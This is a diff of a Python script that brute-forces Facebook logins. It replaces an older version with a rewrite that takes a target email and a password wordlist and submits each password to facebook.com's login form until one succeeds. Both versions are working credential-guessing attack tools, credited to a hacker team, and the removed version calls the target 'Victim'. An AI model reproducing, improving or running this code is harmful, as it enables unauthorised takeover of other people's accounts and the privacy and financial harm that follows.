@@ -1,111 +1,110 @@
-#!usr/bin/python
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
 
+#Creator : Anon6372098
+try:
+ ##----------- Import Libraries -----------##
+ import socket,time,os,optparse,mechanize  ##
+ ##----------------------------------------##
+except:
+	print("[!] The [ mechanize library ] is Missing!\n[*] Please Install it Using this command> [ pip install mechanize ]")
+	exit(1)
+################## check internet #################
+server = "www.google.com"                         #
+def check():                                      #
+   try:                                           #
+      s = socket.gethostbyname(server)            #
+      ss = socket.create_connection((s, 80), 2)   #
+      return True                                 #
+   except:                                        #
+         pass                                     #
+   return False                                   #
+                                                  #
+check = check()                                   #
+###################################################
 
+parse = optparse.OptionParser("""\nUsage: python ./anonfbbrute.py -T <Target Email> -W <Wordlist File>
+OPTIONS:
+        -t <target email>        ::>   Set Target Email
+        -w <word list file>      ::>   Set Wordlist File 
+Example:
+        ./anonfbbrute.py -t target@gmail.com -w /storage/emulated/0/passwords.txt
 
-import sys
-import random
-import mechanize
-import cookielib
+Creator : Anon6372098
+Team : D4RK SYST3M F41LUR3 S33K3R (DSFS)
+Yt Channel : D4RK SYST3M F41LUR3 S33K3R 
+""")
+def Main():
+   parse.add_option("-t","--target",'-T','--TARGET',dest="taremail",type="string",
+			help="target email !")
+   parse.add_option("-w","--wordlist",'-W','--WORDLIST',dest="wlst",type="string",
+			help="wordlist file !")
+   (options,args) = parse.parse_args()
+   if options.taremail !=None and options.wlst !=None: 
+     user = options.taremail
+     passw = options.wlst
+     global check
+     if check == True:
+	         try:
+		    passwfile = open(passw, "r")
+		 except:
+                        print("\n[!] No Such File: "+passw+"  !!!\n")
+                        exit(1)
+		 os.system("cls || clear")
+		 time.sleep(0.10)
+		 print("\n[*] website>: www.facebook.com ")
+		 time.sleep(0.10)
+		 print("\n[+] Target Email>: "+str(user))
+		 time.sleep(0.10)
+		 print("\n[@] WordList>: "+str(passw))
+		 time.sleep(0.10)
+		 print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
+		 time.sleep(0.20)
+		 print("\n[$]--- Brute Force Attack Start ---[$]\n")
+		 time.sleep(0.8)
+		 lo = 1
+		 for password in passwfile:
+				          try:
+                		             br1=mechanize.Browser()
+                		             br1.set_handle_robots(False)
+                                             br1.addheaders=[('User-agent', "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")]
+                		             op=br1.open("https://facebook.com")
+		
+                	                     br1.select_form(nr=0)
+                		             br1.form["email"]=user
+                		             br1.form["pass"]=password
+                		             br1.method="POST"
+                		             res = br1.submit()
+					     result = res.get_data()
+					     if "home_icon" in result:
+                                                print("[+]~[{}] Trying Password[ {} ]  ==> Yes :)".format(lo,password.strip()))
+                   			        print ("\n[*] Found! Password is ==> "+ password)
+					        break
+						
+                		             else:
+                    			          print('[-]~[{}] Testing password[ {} ] ==> No :('.format(lo,password.strip()))
+                    			          lo +=1
+            			          except KeyboardInterrupt:
+                                                 print('\n---------------------------\n[!][CTRL+C] Exiting.....!\n')
+						 exit(1)
+     elif check == False:
+		    print("\n[!] Please Check Your Internet Connection !!!")
+		    exit(1)
+   else:
+	print(parse.usage)
+	exit(1)
 
-
-GHT = '''
-                 
-  @copyright Anon6372098@2018
-        
-'''
-
-
-print "--> Creator : Anon6372098"
-print "--> Team : D4RK SYST3M F41LUR3 S33K3R (DSFS)"
-print "--> Yt Channel : D4RK SYST3M F41LUR3 S33K3R"
-print "--> Contact me : anon6372098@gmail.com
-print "--> Github : /Anon6372098
-
-#if(Fullscreen==true)
-#execute=2*x
-
-email = str(raw_input("--> Username : "))
-passwordlist = str(raw_input("--> Name of the password list : "))
-
-useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
-
-
-
-login = 'https://www.facebook.com/login.php?login_attempt=1'
-def attack(password):
-
-  try:
-     sys.stdout.write("\r--> trying %s.. " % password)
-     sys.stdout.flush()
-     br.addheaders = [('User-agent', random.choice(useragents))]
-     site = br.open(login)
-     br.select_form(nr=0)
-
-      
-         
-     ##Facebook
-     br.form['email'] =email
-     br.form['pass'] = password
-     br.submit()
-     log = br.geturl()
-     if log == login:
-        print "\n\n\n --> Password found .. !!"
-        print "\n --> Password : %s\n" % (password)
-        sys.exit(1)
-  except KeyboardInterrupt:
-        print "\n[*] Exiting program .. "
-        sys.exit(1)
-
-def search():
-    global password
-    for password in passwords:
-        attack(password.replace("\n",""))
-
-
-
-def check():
-
-    global br
-    global passwords
-    try:
-       br = mechanize.Browser()
-       cj = cookielib.LWPCookieJar()
-       br.set_handle_robots(False)
-       br.set_handle_equiv(True)
-       br.set_handle_referer(True)
-       br.set_handle_redirect(True)
-       br.set_cookiejar(cj)
-       br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
-    except KeyboardInterrupt:
-       print "\n--> Exiting program ..\n"
-       sys.exit(1)
-    try:
-       list = open(passwordlist, "r")
-       passwords = list.readlines()
-       k = 0
-       while k < len(passwords):
-          passwords[k] = passwords[k].strip()
-          k += 1
-    except IOError:
-        print "\n --> Error: check your password list path \n"
-        sys.exit(1)
-    except KeyboardInterrupt:
-        print "\n --> Exiting program ..\n"
-        sys.exit(1)
-    try:
-        print GHT
-        print " --> Victim  : %s" % (email)
-        print " --> Total no of password in the wordlist:" , len(passwords), "passwords"
-        print " --> Bruteforce started ..."
-    except KeyboardInterrupt:
-        print "\n [*] Exiting program ..\n"
-        sys.exit(1)
-    try:
-        search()
-        attack(password)
-    except KeyboardInterrupt:
-        print "\n --> Exiting program ..\n"
-        sys.exit(1)
-
-if __name__ == '__main__':
-    check()
+if __name__=='__main__':
+	Main()
+	
+##############################################################
+##################### 		     #########################
+#####################   END OF TOOL  #########################
+#####################                #########################
+##############################################################
+#This Tool by Anon6372098
+#Team D4RK SYST3M F41LUR3 S33K3R (DSFS)
+#Yt Channel : D4RK SYST3M F41LUR3 S33K3R 
+#Contact me : anon6372098@gmail.com
+#Have a nice day :)
+#GoodBye
